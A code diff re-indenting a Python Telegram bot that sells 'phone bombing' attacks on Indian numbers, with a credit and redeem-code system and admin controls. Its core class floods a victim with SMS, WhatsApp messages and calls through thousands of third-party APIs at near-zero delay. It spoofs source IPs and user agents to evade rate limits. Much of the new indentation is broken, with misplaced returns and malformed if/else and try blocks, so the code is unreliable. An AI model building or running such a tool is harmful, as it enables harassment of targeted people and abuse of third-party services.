@@ -857,117 +857,117 @@ if not TELEGRAM_BOT_TOKEN:
 # ULTRA FAST Phone Destroyer Class
 class UltraPhoneDestroyer:
     def __init__(self, user_id, phone):
-    self.running = True
-    self.user_id = user_id
-    self.phone = phone
-    self.stats = {
-"total_requests": 0,
-"successful_hits": 0,
-"failed_attempts": 0,
-"calls_sent": 0,
-"whatsapp_sent": 0,
-"sms_sent": 0,
-"start_time": time.time(),
-"active_apis": len(ULTIMATE_APIS),
-"requests_per_second": 0
-}
-self.last_request_count = 0
-self.last_time_check = time.time()
+        self.running = True
+        self.user_id = user_id
+        self.phone = phone
+        self.stats = {
+            "total_requests": 0,
+            "successful_hits": 0,
+            "failed_attempts": 0,
+            "calls_sent": 0,
+            "whatsapp_sent": 0,
+            "sms_sent": 0,
+            "start_time": time.time(),
+            "active_apis": len(ULTIMATE_APIS),
+            "requests_per_second": 0
+        }
+        self.last_request_count = 0
+        self.last_time_check = time.time()
 
-async def bomb_phone(self, session, api, phone):
-"""ULTRA FAST bombing method with 0.0001 second delays"""
-while self.running:
-try:
-name = api["name"]
-url = api["url"](phone) if callable(api["url"]) else api["url"]
-headers = api["headers"].copy()
+    async def bomb_phone(self, session, api, phone):
+        """ULTRA FAST bombing method with 0.0001 second delays"""
+        while self.running:
+            try:
+                name = api["name"]
+                url = api["url"](phone) if callable(api["url"]) else api["url"]
+                headers = api["headers"].copy()
 
-# Ultra fast IP rotation
-headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-headers["Client-IP"] = headers["X-Forwarded-For"]
-headers["X-Real-IP"] = headers["X-Forwarded-For"]
-headers["User-Agent"] = random.choice([
-"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
-"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
-"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-])
+                # Ultra fast IP rotation
+                headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+                headers["Client-IP"] = headers["X-Forwarded-For"]
+                headers["X-Real-IP"] = headers["X-Forwarded-For"]
+                headers["User-Agent"] = random.choice([
+                    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
+                    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+                ])
 
-self.stats["total_requests"] += 1
+                self.stats["total_requests"] += 1
 
-# Calculate requests per second
-current_time = time.time()
-if current_time - self.last_time_check >= 1:
-self.stats["requests_per_second"] = self.stats["total_requests"] - self.last_request_count
-self.last_request_count = self.stats["total_requests"]
-self.last_time_check = current_time
+                # Calculate requests per second
+                current_time = time.time()
+                if current_time - self.last_time_check >= 1:
+                    self.stats["requests_per_second"] = self.stats["total_requests"] - self.last_request_count
+                    self.last_request_count = self.stats["total_requests"]
+                    self.last_time_check = current_time
 
-# Categorize attack type
-if "call" in name.lower() or "voice" in name.lower():
-attack_type = "CALL"
-self.stats["calls_sent"] += 1
-emoji = "📞"
-elif "whatsapp" in name.lower():
-attack_type = "WHATSAPP"
-self.stats["whatsapp_sent"] += 1
-emoji = "📱"
-else:
-attack_type = "SMS"
-self.stats["sms_sent"] += 1
-emoji = "💬"
+                # Categorize attack type
+                if "call" in name.lower() or "voice" in name.lower():
+                    attack_type = "CALL"
+                    self.stats["calls_sent"] += 1
+                    emoji = "📞"
+                elif "whatsapp" in name.lower():
+                    attack_type = "WHATSAPP"
+                    self.stats["whatsapp_sent"] += 1
+                    emoji = "📱"
+                else:
+                    attack_type = "SMS"
+                    self.stats["sms_sent"] += 1
+                    emoji = "💬"
 
-# ULTRA FAST requests with 0.5 second timeout
-if api["method"] == "POST":
-data = api["data"](phone) if api["data"] else None
-async with session.post(url, headers=headers, data=data, timeout=0.5, ssl=False) as response:
-if response.status in [200, 201, 202]:
-self.stats["successful_hits"] += 1
-print(f"{Fore.RED}[User:{self.user_id}] {emoji} {attack_type} HIT: {name} - SUCCESS! ({self.stats['successful_hits']}){Style.RESET_ALL}")
-else:
-self.stats["failed_attempts"] += 1
-else:
-async with session.get(url, headers=headers, timeout=0.5, ssl=False) as response:
-if response.status in [200, 201, 202]:
-self.stats["successful_hits"] += 1
-print(f"{Fore.RED}[User:{self.user_id}] {emoji} {attack_type} HIT: {name} - SUCCESS! ({self.stats['successful_hits']}){Style.RESET_ALL}")
-else:
-self.stats["failed_attempts"] += 1
+                # ULTRA FAST requests with 0.5 second timeout
+                if api["method"] == "POST":
+                    data = api["data"](phone) if api["data"] else None
+                    async with session.post(url, headers=headers, data=data, timeout=0.5, ssl=False) as response:
+                        if response.status in [200, 201, 202]:
+                            self.stats["successful_hits"] += 1
+                            print(f"{Fore.RED}[User:{self.user_id}] {emoji} {attack_type} HIT: {name} - SUCCESS! ({self.stats['successful_hits']}){Style.RESET_ALL}")
+                        else:
+                            self.stats["failed_attempts"] += 1
+                else:
+                    async with session.get(url, headers=headers, timeout=0.5, ssl=False) as response:
+                        if response.status in [200, 201, 202]:
+                            self.stats["successful_hits"] += 1
+                            print(f"{Fore.RED}[User:{self.user_id}] {emoji} {attack_type} HIT: {name} - SUCCESS! ({self.stats['successful_hits']}){Style.RESET_ALL}")
+                        else:
+                            self.stats["failed_attempts"] += 1
 
-# ULTRA FAST bombing - minimal delay
-await asyncio.sleep(0.0001)
+                # ULTRA FAST bombing - minimal delay
+                await asyncio.sleep(0.0001)
 
-except Exception as e:
-self.stats["failed_attempts"] += 1
-continue
+            except Exception as e:
+                self.stats["failed_attempts"] += 1
+                continue
 
-async def start_destruction(self):
-print(f"\n{Fore.RED}[User:{self.user_id}] 🚀 STARTING ULTRA 3000+ APIS BOMBER!{Style.RESET_ALL}")
-print(f"{Fore.YELLOW}[User:{self.user_id}] 🎯 Target: +91{self.phone}{Style.RESET_ALL}")
-print(f"{Fore.CYAN}[User:{self.user_id}] 💣 Loading {len(ULTIMATE_APIS)} ULTRA FAST APIs...{Style.RESET_ALL}")
+    async def start_destruction(self):
+        print(f"\n{Fore.RED}[User:{self.user_id}] 🚀 STARTING ULTRA 3000+ APIS BOMBER!{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[User:{self.user_id}] 🎯 Target: +91{self.phone}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}[User:{self.user_id}] 💣 Loading {len(ULTIMATE_APIS)} ULTRA FAST APIs...{Style.RESET_ALL}")
 
-# ULTRA FAST connector - unlimited connections
-connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, verify_ssl=False, use_dns_cache=True)
+        # ULTRA FAST connector - unlimited connections
+        connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, verify_ssl=False, use_dns_cache=True)
 
-async with aiohttp.ClientSession(connector=connector) as session:
-tasks = []
-for api in ULTIMATE_APIS:
-task = asyncio.create_task(self.bomb_phone(session, api, self.phone))
-tasks.append(task)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            tasks = []
+            for api in ULTIMATE_APIS:
+                task = asyncio.create_task(self.bomb_phone(session, api, self.phone))
+                tasks.append(task)
 
-await asyncio.gather(*tasks, return_exceptions=True)
+            await asyncio.gather(*tasks, return_exceptions=True)
 
-def stop(self):
-self.running = False
+    def stop(self):
+        self.running = False
 
 # Database Manager
 class DatabaseManager:
     def __init__(self):
-    self.db_file = 'bomber_users.db'
-    self.init_database()
-
+        self.db_file = 'bomber_users.db'
+        self.init_database()
+        
     def init_database(self):
-conn = sqlite3.connect(self.db_file)
-cursor = conn.cursor()
-cursor.execute('''
+        conn = sqlite3.connect(self.db_file)
+        cursor = conn.cursor()
+        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
@@ -976,7 +976,7 @@ cursor.execute('''
                last_attack TEXT
            )
        ''')
-cursor.execute('''
+        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
@@ -985,14 +985,14 @@ cursor.execute('''
                status TEXT
            )
        ''')
-cursor.execute('''
+        cursor.execute('''
            CREATE TABLE IF NOT EXISTS protected_numbers (
                phone TEXT PRIMARY KEY,
                protected_by INTEGER,
                timestamp TEXT
            )
        ''')
-cursor.execute('''
+        cursor.execute('''
            CREATE TABLE IF NOT EXISTS banned_users (
                user_id INTEGER PRIMARY KEY,
                banned_by INTEGER,
@@ -1000,14 +1000,14 @@ cursor.execute('''
                reason TEXT
            )
        ''')
-cursor.execute('''
+        cursor.execute('''
            CREATE TABLE IF NOT EXISTS allowed_users (
                user_id INTEGER PRIMARY KEY,
                allowed_by INTEGER,
                timestamp TEXT
            )
        ''')
-cursor.execute('''
+        cursor.execute('''
            CREATE TABLE IF NOT EXISTS credits (
                user_id INTEGER PRIMARY KEY,
                amount INTEGER DEFAULT 0,
@@ -1016,7 +1016,7 @@ cursor.execute('''
                timestamp TEXT
            )
        ''')
-cursor.execute('''
+        cursor.execute('''
            CREATE TABLE IF NOT EXISTS redeem_codes (
                code TEXT PRIMARY KEY,
                amount INTEGER,
@@ -1027,184 +1027,184 @@ cursor.execute('''
                used_at TEXT
            )
        ''')
-conn.commit()
-conn.close()
-
-def add_user(self, user_id, username):
-conn = sqlite3.connect(self.db_file)
-cursor = conn.cursor()
-cursor.execute('INSERT OR IGNORE INTO users (user_id, username, join_date) VALUES (?, ?, ?)',
-(user_id, username, datetime.now().isoformat()))
-cursor.execute('INSERT OR IGNORE INTO credits (user_id, amount, timestamp) VALUES (?, ?, ?)',
-(user_id, 1500, datetime.now().isoformat()))
-conn.commit()
-conn.close()
-
-def get_user_attack_count(self, user_id):
-conn = sqlite3.connect(self.db_file)
-cursor = conn.cursor()
-cursor.execute('SELECT attack_count FROM users WHERE user_id = ?', (user_id,))
-result = cursor.fetchone()
-conn.close()
-return result[0] if result else 0
-
-def increment_attack_count(self, user_id):
-conn = sqlite3.connect(self.db_file)
-cursor = conn.cursor()
-cursor.execute('UPDATE users SET attack_count = attack_count + 1, last_attack = ? WHERE user_id = ?',
-(datetime.now().isoformat(), user_id))
-conn.commit()
-conn.close()
-
-def log_attack(self, user_id, phone, status):
-conn = sqlite3.connect(self.db_file)
-cursor = conn.cursor()
-cursor.execute('INSERT INTO attacks (user_id, phone, timestamp, status) VALUES (?, ?, ?, ?)',
-(user_id, phone, datetime.now().isoformat(), status))
-conn.commit()
-conn.close()
-
-def get_user_attacks(self, user_id):
-conn = sqlite3.connect(self.db_file)
-cursor = conn.cursor()
-cursor.execute('SELECT phone, timestamp, status FROM attacks WHERE user_id = ? ORDER BY timestamp DESC LIMIT 10',
-(user_id,))
-attacks = cursor.fetchall()
-conn.close()
-return attacks
-
-def get_all_attacks(self):
-conn = sqlite3.connect(self.db_file)
-cursor = conn.cursor()
-cursor.execute('SELECT user_id, phone, timestamp, status FROM attacks ORDER BY timestamp DESC LIMIT 50')
-attacks = cursor.fetchall()
-conn.close()
-return attacks
-
-def get_user_credits(self, user_id):
-conn = sqlite3.connect(self.db_file)
-cursor = conn.cursor()
-cursor.execute('SELECT amount, expiry_date FROM credits WHERE user_id = ?', (user_id,))
-result = cursor.fetchone()
-conn.close()
-if result:
-amount, expiry = result
-if expiry and datetime.fromisoformat(expiry) < datetime.now():
-return 0
-return amount
-return 0
-
-def deduct_credits(self, user_id, amount=1):
-conn = sqlite3.connect(self.db_file)
-cursor = conn.cursor()
-cursor.execute('SELECT amount, expiry_date FROM credits WHERE user_id = ?', (user_id,))
-result = cursor.fetchone()
-
-if not result:
-conn.close()
-return False
-
-current_amount, expiry = result
-if expiry and datetime.fromisoformat(expiry) < datetime.now():
-conn.close()
-return False
-
-if current_amount < amount:
-conn.close()
-return False
-
-cursor.execute('UPDATE credits SET amount = amount - ? WHERE user_id = ? AND amount >= ?', 
-(amount, user_id, amount))
-success = cursor.rowcount > 0
-conn.commit()
-conn.close()
-return success
-
-def redeem_code(self, user_id, code):
-conn = sqlite3.connect(self.db_file)
-cursor = conn.cursor()
-
-try:
-cursor.execute('SELECT amount, days, used_by FROM redeem_codes WHERE code = ?', (code,))
-result = cursor.fetchone()
-
-if not result:
-conn.close()
-return False, "Invalid code!"
-
-amount, days, used_by = result
-
-if used_by:
-conn.close()
-return False, "Code already used!"
-
-new_expiry = None if days == 0 else (datetime.now() + timedelta(days=days)).isoformat()
-
-cursor.execute('SELECT amount, expiry_date FROM credits WHERE user_id = ?', (user_id,))
-current = cursor.fetchone()
-
-if current:
-current_amount, current_expiry = current
-
-if current_expiry and datetime.fromisoformat(current_expiry) < datetime.now():
-new_amount = amount
-final_expiry = new_expiry
-else:
-new_amount = current_amount + amount
-if days == 0:
-final_expiry = None
-elif new_expiry and current_expiry:
-final_expiry = max(new_expiry, current_expiry)
-elif new_expiry:
-final_expiry = new_expiry
-else:
-final_expiry = current_expiry
-
-cursor.execute('UPDATE credits SET amount = ?, expiry_date = ? WHERE user_id = ?',
-(new_amount, final_expiry, user_id))
-credit_success = cursor.rowcount > 0
-else:
-cursor.execute('INSERT INTO credits (user_id, amount, expiry_date, timestamp) VALUES (?, ?, ?, ?)',
-(user_id, amount, new_expiry, datetime.now().isoformat()))
-credit_success = cursor.rowcount > 0
-
-if not credit_success:
-conn.rollback()
-conn.close()
-return False, "Failed to update credits!"
-
-cursor.execute('UPDATE redeem_codes SET used_by = ?, used_at = ? WHERE code = ?',
-(user_id, datetime.now().isoformat(), code))
-
-if cursor.rowcount == 0:
-conn.rollback()
-conn.close()
-return False, "Failed to mark code as used!"
-
-conn.commit()
-conn.close()
-return True, f"Successfully redeemed {amount} credits!"
-
-except Exception as e:
-conn.rollback()
-conn.close()
-return False, f"Error redeeming code: {str(e)}"
-
+        conn.commit()
+        conn.close()
+        
+    def add_user(self, user_id, username):
+        conn = sqlite3.connect(self.db_file)
+        cursor = conn.cursor()
+        cursor.execute('INSERT OR IGNORE INTO users (user_id, username, join_date) VALUES (?, ?, ?)',
+        (user_id, username, datetime.now().isoformat()))
+        cursor.execute('INSERT OR IGNORE INTO credits (user_id, amount, timestamp) VALUES (?, ?, ?)',
+        (user_id, 1500, datetime.now().isoformat()))
+        conn.commit()
+        conn.close()
+        
+    def get_user_attack_count(self, user_id):
+        conn = sqlite3.connect(self.db_file)
+        cursor = conn.cursor()
+        cursor.execute('SELECT attack_count FROM users WHERE user_id = ?', (user_id,))
+        result = cursor.fetchone()
+        conn.close()
+        return result[0] if result else 0
+        
+    def increment_attack_count(self, user_id):
+        conn = sqlite3.connect(self.db_file)
+        cursor = conn.cursor()
+        cursor.execute('UPDATE users SET attack_count = attack_count + 1, last_attack = ? WHERE user_id = ?',
+        (datetime.now().isoformat(), user_id))
+        conn.commit()
+        conn.close()
+        
+    def log_attack(self, user_id, phone, status):
+        conn = sqlite3.connect(self.db_file)
+        cursor = conn.cursor()
+        cursor.execute('INSERT INTO attacks (user_id, phone, timestamp, status) VALUES (?, ?, ?, ?)',
+        (user_id, phone, datetime.now().isoformat(), status))
+        conn.commit()
+        conn.close()
+        
+    def get_user_attacks(self, user_id):
+        conn = sqlite3.connect(self.db_file)
+        cursor = conn.cursor()
+        cursor.execute('SELECT phone, timestamp, status FROM attacks WHERE user_id = ? ORDER BY timestamp DESC LIMIT 10',
+        (user_id,))
+        attacks = cursor.fetchall()
+        conn.close()
+        return attacks
+        
+    def get_all_attacks(self):
+        conn = sqlite3.connect(self.db_file)
+        cursor = conn.cursor()
+        cursor.execute('SELECT user_id, phone, timestamp, status FROM attacks ORDER BY timestamp DESC LIMIT 50')
+        attacks = cursor.fetchall()
+        conn.close()
+        return attacks
+        
+    def get_user_credits(self, user_id):
+        conn = sqlite3.connect(self.db_file)
+        cursor = conn.cursor()
+        cursor.execute('SELECT amount, expiry_date FROM credits WHERE user_id = ?', (user_id,))
+        result = cursor.fetchone()
+        conn.close()
+        if result:
+            amount, expiry = result
+        if expiry and datetime.fromisoformat(expiry) < datetime.now():
+            return 0
+        return amount
+        return 0
+        
+    def deduct_credits(self, user_id, amount=1):
+        conn = sqlite3.connect(self.db_file)
+        cursor = conn.cursor()
+        cursor.execute('SELECT amount, expiry_date FROM credits WHERE user_id = ?', (user_id,))
+        result = cursor.fetchone()
+        
+        if not result:
+            conn.close()
+        return False
+        
+        current_amount, expiry = result
+        if expiry and datetime.fromisoformat(expiry) < datetime.now():
+            conn.close()
+        return False
+        
+        if current_amount < amount:
+            conn.close()
+        return False
+        
+        cursor.execute('UPDATE credits SET amount = amount - ? WHERE user_id = ? AND amount >= ?', 
+        (amount, user_id, amount))
+        success = cursor.rowcount > 0
+        conn.commit()
+        conn.close()
+        return success
+        
+    def redeem_code(self, user_id, code):
+        conn = sqlite3.connect(self.db_file)
+        cursor = conn.cursor()
+        
+        try:
+            cursor.execute('SELECT amount, days, used_by FROM redeem_codes WHERE code = ?', (code,))
+        result = cursor.fetchone()
+        
+        if not result:
+            conn.close()
+        return False, "Invalid code!"
+        
+        amount, days, used_by = result
+        
+        if used_by:
+            conn.close()
+        return False, "Code already used!"
+        
+        new_expiry = None if days == 0 else (datetime.now() + timedelta(days=days)).isoformat()
+        
+        cursor.execute('SELECT amount, expiry_date FROM credits WHERE user_id = ?', (user_id,))
+        current = cursor.fetchone()
+        
+        if current:
+            current_amount, current_expiry = current
+        
+        if current_expiry and datetime.fromisoformat(current_expiry) < datetime.now():
+            new_amount = amount
+        final_expiry = new_expiry
+        else:
+            new_amount = current_amount + amount
+        if days == 0:
+            final_expiry = None
+        elif new_expiry and current_expiry:
+            final_expiry = max(new_expiry, current_expiry)
+        elif new_expiry:
+            final_expiry = new_expiry
+        else:
+            final_expiry = current_expiry
+        
+        cursor.execute('UPDATE credits SET amount = ?, expiry_date = ? WHERE user_id = ?',
+        (new_amount, final_expiry, user_id))
+        credit_success = cursor.rowcount > 0
+        else:
+            cursor.execute('INSERT INTO credits (user_id, amount, expiry_date, timestamp) VALUES (?, ?, ?, ?)',
+        (user_id, amount, new_expiry, datetime.now().isoformat()))
+        credit_success = cursor.rowcount > 0
+        
+        if not credit_success:
+            conn.rollback()
+        conn.close()
+        return False, "Failed to update credits!"
+        
+        cursor.execute('UPDATE redeem_codes SET used_by = ?, used_at = ? WHERE code = ?',
+        (user_id, datetime.now().isoformat(), code))
+        
+        if cursor.rowcount == 0:
+            conn.rollback()
+        conn.close()
+        return False, "Failed to mark code as used!"
+        
+        conn.commit()
+        conn.close()
+        return True, f"Successfully redeemed {amount} credits!"
+        
+        except Exception as e:
+            conn.rollback()
+        conn.close()
+        return False, f"Error redeeming code: {str(e)}"
+        
 db_manager = DatabaseManager()
 active_attackers = {}
 
 def get_user_keyboard():
-"""User menu keyboard with buttons"""
-keyboard = [
-[KeyboardButton("💣 Start Attack"), KeyboardButton("🛑 Stop Attack")],
-[KeyboardButton("📊 My Stats"), KeyboardButton("💰 My Credits")],
+        """User menu keyboard with buttons"""
+        keyboard = [
+        [KeyboardButton("💣 Start Attack"), KeyboardButton("🛑 Stop Attack")],
+        [KeyboardButton("📊 My Stats"), KeyboardButton("💰 My Credits")],
 [KeyboardButton("🎫 Redeem Code"), KeyboardButton("📋 My History")],
 [KeyboardButton("❓ Help"), KeyboardButton("ℹ️ About")]
 ]
 return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
 def get_admin_keyboard():
-"""Admin menu keyboard with all controls"""
+    """Admin menu keyboard with all controls"""
 keyboard = [
 [KeyboardButton("💣 Start Attack"), KeyboardButton("🛑 Stop Attack")],
 [KeyboardButton("➕ Protect Number"), KeyboardButton("➖ Unprotect Number")],
@@ -1219,25 +1219,25 @@ keyboard = [
 return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
 async def check_membership(update: Update, context: ContextTypes.DEFAULT_TYPE):
-user_id = update.effective_user.id
+    user_id = update.effective_user.id
 
 if user_id in ADMIN_IDS:
-return True
+    return True
 
 try:
-member = await context.bot.get_chat_member(CHANNEL_USERNAME, user_id)
+    member = await context.bot.get_chat_member(CHANNEL_USERNAME, user_id)
 return member.status in [ChatMember.MEMBER, ChatMember.ADMINISTRATOR, ChatMember.OWNER]
 except:
-return False
+    return False
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-user = update.effective_user
+    user = update.effective_user
 db_manager.add_user(user.id, user.username or user.first_name)
 
 is_admin = user.id in ADMIN_IDS
 
 if is_admin:
-welcome_msg = f"""
+    welcome_msg = f"""
 🔥 *{BOT_NAME}* 🔥
 
 Welcome Admin {user.first_name}! 👑
@@ -1264,7 +1264,7 @@ Join our channel: {CHANNEL_USERNAME}
 """
 keyboard = get_admin_keyboard()
 else:
-welcome_msg = f"""
+    welcome_msg = f"""
 🔥 *{BOT_NAME}* 🔥
 
 Welcome {user.first_name}! 👋
@@ -1290,10 +1290,10 @@ keyboard = get_user_keyboard()
 await update.message.reply_text(welcome_msg, parse_mode='Markdown', reply_markup=keyboard)
 
 async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-user_id = update.effective_user.id
+    user_id = update.effective_user.id
 
 if not await check_membership(update, context):
-await update.message.reply_text(
+    await update.message.reply_text(
 f"⚠️ Please join {CHANNEL_USERNAME} first to use this bot!",
 parse_mode='Markdown'
 )
@@ -1307,20 +1307,20 @@ parse_mode='Markdown'
 context.user_data['awaiting_phone'] = True
 
 async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-user_id = update.effective_user.id
+    user_id = update.effective_user.id
 
 if user_id in active_attackers:
-active_attackers[user_id].stop()
+    active_attackers[user_id].stop()
 del active_attackers[user_id]
 await update.message.reply_text("✅ Attack stopped!", parse_mode='Markdown')
 else:
-await update.message.reply_text("❌ No active attack found!", parse_mode='Markdown')
+    await update.message.reply_text("❌ No active attack found!", parse_mode='Markdown')
 
 async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-user_id = update.effective_user.id
+    user_id = update.effective_user.id
 
 if user_id in active_attackers:
-destroyer = active_attackers[user_id]
+    destroyer = active_attackers[user_id]
 stats = destroyer.stats
 elapsed_time = time.time() - stats["start_time"]
 
@@ -1344,7 +1344,7 @@ stats_msg = f"""
 """
 await update.message.reply_text(stats_msg, parse_mode='Markdown')
 else:
-attack_count = db_manager.get_user_attack_count(user_id)
+    attack_count = db_manager.get_user_attack_count(user_id)
 is_admin = user_id in ADMIN_IDS
 admin_badge = " 👑" if is_admin else ""
 
@@ -1360,42 +1360,42 @@ Use "💣 Start Attack" to begin!
 await update.message.reply_text(stats_msg, parse_mode='Markdown')
 
 async def myattacks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-user_id = update.effective_user.id
+    user_id = update.effective_user.id
 attacks = db_manager.get_user_attacks(user_id)
 
 if not attacks:
-await update.message.reply_text("❌ No attack history found!", parse_mode='Markdown')
+    await update.message.reply_text("❌ No attack history found!", parse_mode='Markdown')
 return
 
 msg = "📋 *Your Recent Attacks*\n━━━━━━━━━━━━━━━━━━━━━\n\n"
 for phone, timestamp, status in attacks:
-dt = datetime.fromisoformat(timestamp)
+    dt = datetime.fromisoformat(timestamp)
 msg += f"📱 +91{phone}\n⏰ {dt.strftime('%Y-%m-%d %H:%M:%S')}\n✅ {status}\n\n"
 
 await update.message.reply_text(msg, parse_mode='Markdown')
 
 async def allattacks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-user_id = update.effective_user.id
+    user_id = update.effective_user.id
 
 if user_id not in ADMIN_IDS:
-await update.message.reply_text("❌ Admin only command!", parse_mode='Markdown')
+    await update.message.reply_text("❌ Admin only command!", parse_mode='Markdown')
 return
 
 attacks = db_manager.get_all_attacks()
 
 if not attacks:
-await update.message.reply_text("❌ No attack history found!", parse_mode='Markdown')
+    await update.message.reply_text("❌ No attack history found!", parse_mode='Markdown')
 return
 
 msg = "📋 *All Recent Attacks*\n━━━━━━━━━━━━━━━━━━━━━\n\n"
 for uid, phone, timestamp, status in attacks[:20]:
-dt = datetime.fromisoformat(timestamp)
+    dt = datetime.fromisoformat(timestamp)
 msg += f"👤 User: {uid}\n📱 +91{phone}\n⏰ {dt.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
 
 await update.message.reply_text(msg, parse_mode='Markdown')
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-help_msg = f"""
+    help_msg = f"""
 ❓ *Help & Instructions*
 ━━━━━━━━━━━━━━━━━━━━━
 
@@ -1416,7 +1416,7 @@ Contact: {CHANNEL_USERNAME}
 await update.message.reply_text(help_msg, parse_mode='Markdown')
 
 async def about_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-about_msg = f"""
+    about_msg = f"""
 ℹ️ *About {BOT_NAME}*
 ━━━━━━━━━━━━━━━━━━━━━
 
@@ -1436,12 +1436,12 @@ Made with 💣 for power users!
 await update.message.reply_text(about_msg, parse_mode='Markdown')
 
 async def credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-user_id = update.effective_user.id
+    user_id = update.effective_user.id
 credits = db_manager.get_user_credits(user_id)
 is_admin = user_id in ADMIN_IDS
 
 if is_admin:
-msg = f"""
+    msg = f"""
 💰 *Your Credits*
 ━━━━━━━━━━━━━━━━━━━━━
 
@@ -1451,7 +1451,7 @@ msg = f"""
 You have unlimited attacks!
 """
 else:
-msg = f"""
+    msg = f"""
 💰 *Your Credits*
 ━━━━━━━━━━━━━━━━━━━━━
 
@@ -1463,22 +1463,22 @@ Use 🎫 Redeem Code to add more credits!
 await update.message.reply_text(msg, parse_mode='Markdown')
 
 async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-user_id = update.effective_user.id
+    user_id = update.effective_user.id
 
 if context.args:
-code = context.args[0].upper()
+    code = context.args[0].upper()
 success, message = db_manager.redeem_code(user_id, code)
 
 if success:
-credits = db_manager.get_user_credits(user_id)
+    credits = db_manager.get_user_credits(user_id)
 await update.message.reply_text(
 f"✅ {message}\n\n💰 *Total Credits:* {credits}",
 parse_mode='Markdown'
 )
 else:
-await update.message.reply_text(f"❌ {message}", parse_mode='Markdown')
+    await update.message.reply_text(f"❌ {message}", parse_mode='Markdown')
 else:
-await update.message.reply_text(
+    await update.message.reply_text(
 "🎫 *Redeem Code*\n\n"
 "Send code like: `/redeem YOURCODE123`\n\n"
 "Or use the 🎫 Redeem Code button and send the code!",
@@ -1487,10 +1487,10 @@ parse_mode='Markdown'
 context.user_data['awaiting_redeem'] = True
 
 async def get_all_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
-user_id = update.effective_user.id
+    user_id = update.effective_user.id
 
 if user_id not in ADMIN_IDS:
-await update.message.reply_text("❌ Admin only!", parse_mode='Markdown')
+    await update.message.reply_text("❌ Admin only!", parse_mode='Markdown')
 return
 
 conn = sqlite3.connect('bomber_users.db')
@@ -1503,104 +1503,104 @@ users = cursor.fetchall()
 conn.close()
 
 if not users:
-await update.message.reply_text("👥 No users found!", parse_mode='Markdown')
+    await update.message.reply_text("👥 No users found!", parse_mode='Markdown')
 return
 
 msg = "👥 All Users\n━━━━━━━━━━━━━━━━━━━━━\n\n"
 for uid, username, attacks, joined, credits in users[:50]:
-username_str = f"@{username}" if username else "No username"
+    username_str = f"@{username}" if username else "No username"
 credits_amount = credits if credits is not None else 0
 msg += f"🆔 Chat ID: {uid}\n👤 Username: {username_str}\n💰 Credits: {credits_amount}\n💣 Attacks: {attacks}\n\n"
 
 if len(users) > 50:
-msg += f"\n... and {len(users) - 50} more users"
+    msg += f"\n... and {len(users) - 50} more users"
 
 await update.message.reply_text(msg)
 
 async def show_protected_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
-conn = sqlite3.connect('bomber_users.db')
+    conn = sqlite3.connect('bomber_users.db')
 cursor = conn.cursor()
 cursor.execute('SELECT phone, protected_by, timestamp FROM protected_numbers ORDER BY timestamp DESC')
 numbers = cursor.fetchall()
 conn.close()
 
 if not numbers:
-await update.message.reply_text("📜 No protected numbers!", parse_mode='Markdown')
+    await update.message.reply_text("📜 No protected numbers!", parse_mode='Markdown')
 return
 
 msg = "🔒 *Protected Numbers*\n━━━━━━━━━━━━━━━━━━━━━\n\n"
 for phone, by_admin, time in numbers[:30]:
-msg += f"📱 +91{phone}\n👤 By: {by_admin}\n⏰ {time}\n\n"
+    msg += f"📱 +91{phone}\n👤 By: {by_admin}\n⏰ {time}\n\n"
 
 if len(numbers) > 30:
-msg += f"\n... and {len(numbers) - 30} more"
+    msg += f"\n... and {len(numbers) - 30} more"
 
 await update.message.reply_text(msg, parse_mode='Markdown')
 
 async def show_banned_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
-conn = sqlite3.connect('bomber_users.db')
+    conn = sqlite3.connect('bomber_users.db')
 cursor = conn.cursor()
 cursor.execute('SELECT user_id, banned_by, timestamp, reason FROM banned_users ORDER BY timestamp DESC')
 banned = cursor.fetchall()
 conn.close()
 
 if not banned:
-await update.message.reply_text("📵 No banned users!", parse_mode='Markdown')
+    await update.message.reply_text("📵 No banned users!", parse_mode='Markdown')
 return
 
 msg = "🚫 *Banned Users*\n━━━━━━━━━━━━━━━━━━━━━\n\n"
 for uid, by_admin, time, reason in banned[:30]:
-reason_str = reason or "No reason"
+    reason_str = reason or "No reason"
 msg += f"🆔 {uid}\n👤 By: {by_admin}\n⏰ {time}\n📝 {reason_str}\n\n"
 
 if len(banned) > 30:
-msg += f"\n... and {len(banned) - 30} more"
+    msg += f"\n... and {len(banned) - 30} more"
 
 await update.message.reply_text(msg, parse_mode='Markdown')
 
